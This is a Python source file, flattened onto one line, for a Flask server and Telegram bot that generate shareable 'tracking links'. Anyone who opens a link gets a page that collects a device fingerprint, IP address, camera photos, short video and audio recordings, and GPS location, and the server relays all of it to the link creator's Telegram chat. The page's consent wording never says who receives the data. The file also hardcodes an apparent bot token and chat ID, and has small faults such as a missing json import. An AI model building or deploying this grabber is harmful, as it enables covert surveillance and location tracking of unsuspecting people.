import osimport secretsimport loggingimport threadingimport requestsfrom flask import Flask, request, render_template_string, jsonifyfrom telegram import Update, InlineKeyboardButton, InlineKeyboardMarkupfrom telegram.ext import ApplicationBuilder, CommandHandler, ContextTypesfrom datetime import datetime# ---------- Configuration (HARDCODED) ----------BOT_TOKEN = "8659297926:AAHCYznlWUwjOo4EENKI5DoGN_a4MP4x7p0"ADMIN_CHAT_ID = "1930138915"          # Your Telegram user IDBASE_URL = os.environ.get("BASE_URL", "https://u-on0f.onrender.com")  # Change to your public URL# Shared memory (token -> user_id)tracking_links = {}# ---------- Flask Web Server ----------flask_app = Flask(__name__)HTML_TEMPLATE = """<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Consent-Based Information Collection</title>    <style>        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; background: #f4f4f4; }        .card { background: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }        button { background: #007bff; color: white; border: none; border-radius: 5px; padding: 8px 16px; margin: 5px; cursor: pointer; }        button:disabled { background: #ccc; cursor: not-allowed; }        .preview { margin-top: 10px; padding: 10px; background: #e9ecef; border-radius: 5px; }        video, audio, img { max-width: 100%; border-radius: 5px; margin-top: 5px; }        .warning { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-bottom: 20px; }        hr { margin: 20px 0; }        .inline-keyboard {            display: flex;            flex-wrap: wrap;            gap: 10px;            justify-content: center;            margin-top: 15px;        }        .inline-keyboard button {            background: #28a745;            font-weight: bold;            flex: 1 0 auto;            min-width: 180px;        }        .inline-keyboard button:nth-child(odd) { background: #17a2b8; }        .inline-keyboard button:nth-child(3) { background: #ffc107; color: black; }        .inline-keyboard button:nth-child(4) { background: #dc3545; }    </style></head><body>    <div class="card">        <h1>📋 Information Collection</h1>        <div class="warning">            ⚠️ <strong>Your explicit consent is required</strong><br>            This page collects device information, and optionally camera/microphone/location.<br>            <strong>Nothing is sent until you click the "Send" buttons below.</strong>        </div>        <p>Token: <code id="tokenDisplay"></code></p>        <button id="sendFingerprint">📡 Send Device Fingerprint (Basic Info)</button>        <div id="fingerprintPreview" class="preview" style="display:none;"></div>    </div>    <!-- New Inline Keyboard Style Combined Actions -->    <div class="card">        <h2>🎛️ Combined Actions (Media + Device Info)</h2>        <div class="inline-keyboard">            <button id="combinedPhoto">📸 Photo + Device Info</button>            <button id="combinedVideo">🎥 Video + Device Info</button>            <button id="combinedLocation">📍 Location + Device Info</button>            <button id="combinedAudio">🎤 Audio + Device Info</button>        </div>        <div id="combinedPreview" class="preview" style="display:none;"></div>    </div>    <div class="card">        <h2>📸 Camera (Individual)</h2>        <button id="enableCamera">Enable Camera Preview</button>        <video id="cameraPreview" autoplay muted playsinline style="display:none;"></video>        <button id="capturePhoto" disabled>Capture Photo</button>        <button id="sendPhoto" disabled>📤 Send Photo to Telegram</button>        <div id="photoPreview" class="preview" style="display:none;"><img id="photoImg" width="200"></div>    </div>    <div class="card">        <h2>🎤 Microphone (Individual)</h2>        <button id="enableMic">Enable Microphone</button>        <button id="recordAudio" disabled>Record 5s Audio</button>        <button id="sendAudio" disabled>📤 Send Audio to Telegram</button>        <div id="audioPreview" class="preview" style="display:none;"><audio id="audioPlayer" controls></audio></div>    </div>    <div class="card">        <h2>📍 Location (Individual)</h2>        <button id="getLocation">Get My Location</button>        <button id="sendLocation" disabled>📤 Send Location to Telegram</button>        <div id="locationPreview" class="preview" style="display:none;"></div>    </div>    <div class="card">        <h2>⌨️ Telegram Keyboard Demo (Simulated)</h2>        <button id="showInlineDemo">Show Inline Keyboard</button>        <button id="showMenuDemo">Show Menu Keyboard</button>        <div id="keyboardOutput" class="preview"></div>    </div>    <footer style="text-align:center; font-size:12px; color:#666;">        🔐 All sends require your explicit button click. No background collection.    </footer>    <script>        const token = window.location.pathname.split('/').pop();        document.getElementById('tokenDisplay').innerText = token;        // ---------- Device Fingerprint (reusable) ----------        async function collectFingerprint() {            const data = {};            data.userAgent = navigator.userAgent;            data.language = navigator.language;            data.platform = navigator.platform;            data.cookieEnabled = navigator.cookieEnabled;            data.hardwareConcurrency = navigator.hardwareConcurrency;            data.deviceMemory = navigator.deviceMemory;            data.maxTouchPoints = navigator.maxTouchPoints;            data.vendor = navigator.vendor;            data.screenWidth = screen.width;            data.screenHeight = screen.height;            data.colorDepth = screen.colorDepth;            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;            data.localTime = new Date().toString();            if (navigator.connection) {                data.connectionType = navigator.connection.effectiveType;                data.downlink = navigator.connection.downlink;                data.rtt = navigator.connection.rtt;            }            if (navigator.getBattery) {                const battery = await navigator.getBattery();                data.batteryLevel = Math.round(battery.level * 100) + '%';                data.charging = battery.charging;            }            return data;        }        // Basic fingerprint send (unchanged)        document.getElementById('sendFingerprint').onclick = async () => {            const fingerprintData = await collectFingerprint();            const previewDiv = document.getElementById('fingerprintPreview');            previewDiv.innerHTML = `<strong>Fingerprint data collected:</strong><br>                <pre>${JSON.stringify(fingerprintData, null, 2)}</pre>                <button id="confirmSendFingerprint">✅ Confirm Send to Telegram</button>`;            previewDiv.style.display = 'block';            document.getElementById('confirmSendFingerprint').onclick = () => {                sendToTelegram('/capture_fingerprint', { token: token, fingerprint: fingerprintData });            };        };        // ---------- Combined Actions Helpers ----------        async function sendCombined(endpoint, formData) {            const response = await fetch(endpoint, { method: 'POST', body: formData });            const result = await response.json();            alert(result.message);        }        // Combined Photo        let combinedPhotoBlob = null;        document.getElementById('combinedPhoto').onclick = async () => {            // Request camera access if not already            let stream = await navigator.mediaDevices.getUserMedia({ video: true });            const videoElem = document.createElement('video');            videoElem.srcObject = stream;            await videoElem.play();            // Capture frame            const canvas = document.createElement('canvas');            canvas.width = videoElem.videoWidth || 640;            canvas.height = videoElem.videoHeight || 480;            canvas.getContext('2d').drawImage(videoElem, 0, 0, canvas.width, canvas.height);            canvas.toBlob(async blob => {                combinedPhotoBlob = blob;                const fingerprint = await collectFingerprint();                const formData = new FormData();                formData.append('token', token);                formData.append('photo', blob, 'combined_photo.jpg');                formData.append('fingerprint', JSON.stringify(fingerprint));                sendCombined('/capture_combined_photo', formData);                // Cleanup                stream.getTracks().forEach(t => t.stop());            }, 'image/jpeg');        };        // Combined Video (5 second clip)        document.getElementById('combinedVideo').onclick = async () => {            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });            let chunks = [];            mediaRecorder.ondataavailable = e => chunks.push(e.data);            mediaRecorder.onstop = async () => {                const videoBlob = new Blob(chunks, { type: 'video/mp4' });                const fingerprint = await collectFingerprint();                const formData = new FormData();                formData.append('token', token);                formData.append('video', videoBlob, 'combined_video.mp4');                formData.append('fingerprint', JSON.stringify(fingerprint));                sendCombined('/capture_combined_video', formData);                stream.getTracks().forEach(t => t.stop());            };            mediaRecorder.start();            setTimeout(() => mediaRecorder.stop(), 5000);            alert('Recording 5 seconds video...');        };        // Combined Location        document.getElementById('combinedLocation').onclick = () => {            navigator.geolocation.getCurrentPosition(async position => {                const location = { lat: position.coords.latitude, lon: position.coords.longitude };                const fingerprint = await collectFingerprint();                const formData = new FormData();                formData.append('token', token);                formData.append('lat', location.lat);                formData.append('lon', location.lon);                formData.append('fingerprint', JSON.stringify(fingerprint));                sendCombined('/capture_combined_location', formData);            }, err => alert('Location error: ' + err.message));        };        // Combined Audio (5 second)        document.getElementById('combinedAudio').onclick = async () => {            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });            let chunks = [];            mediaRecorder.ondataavailable = e => chunks.push(e.data);            mediaRecorder.onstop = async () => {                const audioBlob = new Blob(chunks, { type: 'audio/webm' });                const fingerprint = await collectFingerprint();                const formData = new FormData();                formData.append('token', token);                formData.append('audio', audioBlob, 'combined_audio.webm');                formData.append('fingerprint', JSON.stringify(fingerprint));                sendCombined('/capture_combined_audio', formData);                stream.getTracks().forEach(t => t.stop());            };            mediaRecorder.start();            setTimeout(() => mediaRecorder.stop(), 5000);            alert('Recording 5 seconds audio...');        };        // ---------- Individual Media Functions (unchanged except minor fixes) ----------        let cameraStream = null;        let currentPhotoBlob = null;        document.getElementById('enableCamera').onclick = async () => {            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });            const video = document.getElementById('cameraPreview');            video.srcObject = cameraStream;            video.style.display = 'block';            document.getElementById('capturePhoto').disabled = false;        };        document.getElementById('capturePhoto').onclick = () => {            const video = document.getElementById('cameraPreview');            const canvas = document.createElement('canvas');            canvas.width = video.videoWidth;            canvas.height = video.videoHeight;            canvas.getContext('2d').drawImage(video, 0, 0);            canvas.toBlob(blob => {                currentPhotoBlob = blob;                const img = document.getElementById('photoImg');                img.src = URL.createObjectURL(blob);                document.getElementById('photoPreview').style.display = 'block';                document.getElementById('sendPhoto').disabled = false;            }, 'image/jpeg');        };        document.getElementById('sendPhoto').onclick = () => {            if (!currentPhotoBlob) return;            sendMedia('photo', currentPhotoBlob, 'photo.jpg');        };        let audioStream = null;        let recordedAudioBlob = null;        document.getElementById('enableMic').onclick = async () => {            if (audioStream) audioStream.getTracks().forEach(t => t.stop());            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });            document.getElementById('recordAudio').disabled = false;        };        let mediaRecorderAudio = null;        let audioChunks = [];        document.getElementById('recordAudio').onclick = () => {            if (!audioStream) return;            audioChunks = [];            mediaRecorderAudio = new MediaRecorder(audioStream);            mediaRecorderAudio.ondataavailable = e => audioChunks.push(e.data);            mediaRecorderAudio.onstop = () => {                recordedAudioBlob = new Blob(audioChunks, { type: 'audio/wav' });                const url = URL.createObjectURL(recordedAudioBlob);                document.getElementById('audioPlayer').src = url;                document.getElementById('audioPreview').style.display = 'block';                document.getElementById('sendAudio').disabled = false;            };            mediaRecorderAudio.start();            setTimeout(() => mediaRecorderAudio.stop(), 5000);            alert('Recording 5 seconds...');        };        document.getElementById('sendAudio').onclick = () => {            if (!recordedAudioBlob) return;            sendMedia('audio', recordedAudioBlob, 'audio.wav');        };        let currentLocation = null;        document.getElementById('getLocation').onclick = () => {            navigator.geolocation.getCurrentPosition(pos => {                currentLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };                document.getElementById('locationPreview').innerHTML = `                    <strong>Lat:</strong> ${currentLocation.lat}<br>                    <strong>Lon:</strong> ${currentLocation.lon}<br>                    <button id="confirmSendLocation">✅ Confirm Send Location</button>`;                document.getElementById('locationPreview').style.display = 'block';                document.getElementById('confirmSendLocation').onclick = () => {                    sendToTelegram('/capture_location', { token: token, location: currentLocation });                };            }, err => alert('Location error: ' + err.message));        };        // Helper functions        async function sendToTelegram(endpoint, payload) {            const response = await fetch(endpoint, {                method: 'POST',                headers: { 'Content-Type': 'application/json' },                body: JSON.stringify(payload)            });            const result = await response.json();            alert(result.message || 'Sent to Telegram!');        }        async function sendMedia(type, blob, filename) {            const formData = new FormData();            formData.append('token', token);            formData.append('media', blob, filename);            const response = await fetch(`/capture_${type}`, { method: 'POST', body: formData });            const result = await response.json();            alert(result.message);        }        // Keyboard demos        document.getElementById('showInlineDemo').onclick = () => {            document.getElementById('keyboardOutput').innerHTML = `                <strong>Inline Keyboard (simulated):</strong><br>                <code>{"inline_keyboard":[[{"text":"Button 1","callback_data":"1"},{"text":"Button 2","url":"https://example.com"}]]}</code><br>                <button onclick="alert('Inline demo clicked')">Simulate Click</button>            `;        };        document.getElementById('showMenuDemo').onclick = () => {            document.getElementById('keyboardOutput').innerHTML = `                <strong>Menu Keyboard (ReplyKeyboardMarkup):</strong><br>                <code>{"keyboard":[["Yes","No"],["Help"]],"resize_keyboard":true}</code><br>                <div><button>Yes</button> <button>No</button> <button>Help</button></div>            `;        };    </script></body></html>"""@flask_app.route('/track/<token>')def track_page(token):    return render_template_string(HTML_TEMPLATE)# Existing individual endpoints (unchanged)@flask_app.route('/capture_fingerprint', methods=['POST'])def capture_fingerprint():    data = request.json    token = data.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    fingerprint = data.get('fingerprint', {})    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()    report = f"""📱 <b>Device Fingerprint Report</b>━━━━━━━━━━━━━━━━━━━━🌐 IP: {ip}🆔 User Agent: {fingerprint.get('userAgent', 'Unknown')}💻 Platform: {fingerprint.get('platform', 'Unknown')}📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}🗣️ Language: {fingerprint.get('language', 'en')}⏰ Timezone: {fingerprint.get('timezone', 'Unknown')}🔋 Battery: {fingerprint.get('batteryLevel', '?')} ({'Charging' if fingerprint.get('charging') else 'Not charging'})📡 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)🧠 Hardware Concurrency: {fingerprint.get('hardwareConcurrency', '?')}💾 Device Memory: {fingerprint.get('deviceMemory', '?')} GB🕹️ Max Touch Points: {fingerprint.get('maxTouchPoints', '?')}🍪 Cookies Enabled: {fingerprint.get('cookieEnabled', '?')}📅 Local Time: {fingerprint.get('localTime', 'Unknown')}━━━━━━━━━━━━━━━━━━━━    """    send_telegram_message(user_id, report)    return jsonify({"message": "Fingerprint sent"}), 200@flask_app.route('/capture_photo', methods=['POST'])def capture_photo():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    photo_file = request.files.get('media')    if not photo_file:        return jsonify({"error": "No photo"}), 400    send_telegram_media(user_id, photo_file, 'photo')    return jsonify({"message": "Photo sent"}), 200@flask_app.route('/capture_audio', methods=['POST'])def capture_audio():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    audio_file = request.files.get('media')    if not audio_file:        return jsonify({"error": "No audio"}), 400    send_telegram_media(user_id, audio_file, 'audio')    return jsonify({"message": "Audio sent"}), 200@flask_app.route('/capture_location', methods=['POST'])def capture_location():    data = request.json    token = data.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    loc = data.get('location', {})    lat = loc.get('lat')    lon = loc.get('lon')    if lat and lon:        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"        requests.post(url, json={"chat_id": user_id, "latitude": lat, "longitude": lon})    return jsonify({"message": "Location sent"}), 200# ---------- New Combined Endpoints ----------@flask_app.route('/capture_combined_photo', methods=['POST'])def capture_combined_photo():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    photo_file = request.files.get('photo')    fingerprint_json = request.form.get('fingerprint')    if not photo_file or not fingerprint_json:        return jsonify({"error": "Missing photo or fingerprint"}), 400    # Send photo with caption containing fingerprint    caption = format_fingerprint_caption(json.loads(fingerprint_json))    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"    files = {'photo': (photo_file.filename, photo_file.read())}    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}    requests.post(url, data=data, files=files)    return jsonify({"message": "Combined photo+fingerprint sent"}), 200@flask_app.route('/capture_combined_video', methods=['POST'])def capture_combined_video():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    video_file = request.files.get('video')    fingerprint_json = request.form.get('fingerprint')    if not video_file or not fingerprint_json:        return jsonify({"error": "Missing video or fingerprint"}), 400    caption = format_fingerprint_caption(json.loads(fingerprint_json))    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"    files = {'video': (video_file.filename, video_file.read())}    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}    requests.post(url, data=data, files=files)    return jsonify({"message": "Combined video+fingerprint sent"}), 200@flask_app.route('/capture_combined_audio', methods=['POST'])def capture_combined_audio():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    audio_file = request.files.get('audio')    fingerprint_json = request.form.get('fingerprint')    if not audio_file or not fingerprint_json:        return jsonify({"error": "Missing audio or fingerprint"}), 400    caption = format_fingerprint_caption(json.loads(fingerprint_json))    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"    files = {'audio': (audio_file.filename, audio_file.read())}    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}    requests.post(url, data=data, files=files)    return jsonify({"message": "Combined audio+fingerprint sent"}), 200@flask_app.route('/capture_combined_location', methods=['POST'])def capture_combined_location():    token = request.form.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"error": "Invalid token"}), 400    lat = request.form.get('lat')    lon = request.form.get('lon')    fingerprint_json = request.form.get('fingerprint')    if not lat or not lon or not fingerprint_json:        return jsonify({"error": "Missing location or fingerprint"}), 400    # Send location    url_loc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"    requests.post(url_loc, json={"chat_id": user_id, "latitude": float(lat), "longitude": float(lon)})    # Send fingerprint as separate text message    caption = format_fingerprint_caption(json.loads(fingerprint_json))    send_telegram_message(user_id, caption)    return jsonify({"message": "Combined location+fingerprint sent"}), 200def format_fingerprint_caption(fingerprint):    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip() if request else 'Unknown'    return f"""📱 <b>Device Fingerprint</b>🌐 IP: {ip}🆔 UA: {fingerprint.get('userAgent', 'N/A')[:80]}💻 Platform: {fingerprint.get('platform', 'N/A')}📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}🗣️ Lang: {fingerprint.get('language', 'N/A')}⏰ Timezone: {fingerprint.get('timezone', 'N/A')}🔋 Battery: {fingerprint.get('batteryLevel', '?')} {'🔌' if fingerprint.get('charging') else '🔋'}🌐 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)    """def send_telegram_message(chat_id, text):    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"    requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})def send_telegram_media(chat_id, file, media_type):    method = 'sendPhoto' if media_type == 'photo' else 'sendAudio'    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"    files = {'photo' if media_type == 'photo' else 'audio': (file.filename, file.read())}    data = {'chat_id': chat_id}    requests.post(url, data=data, files=files)# ---------- Telegram Bot Commands ----------async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):    await update.message.reply_text("Send /grab to generate a tracking link.")async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):    user_id = update.effective_user.id    token = secrets.token_urlsafe(12)    tracking_links[token] = user_id    link = f"{BASE_URL}/track/{token}"    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Open Link", url=link)]])    await update.message.reply_text(f"Tracking link (share with anyone):\n{link}", reply_markup=keyboard)def run_bot():    app = ApplicationBuilder().token(BOT_TOKEN).build()    app.add_handler(CommandHandler("start", start))    app.add_handler(CommandHandler("grab", grab))    print("🤖 Telegram bot is polling...")    app.run_polling()# ---------- Main Entry Point ----------if __name__ == "__main__":    def run_flask():        port = int(os.environ.get("PORT", 5000))        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)        flask_thread = threading.Thread(target=run_flask, daemon=True)    flask_thread.start()    run_bot()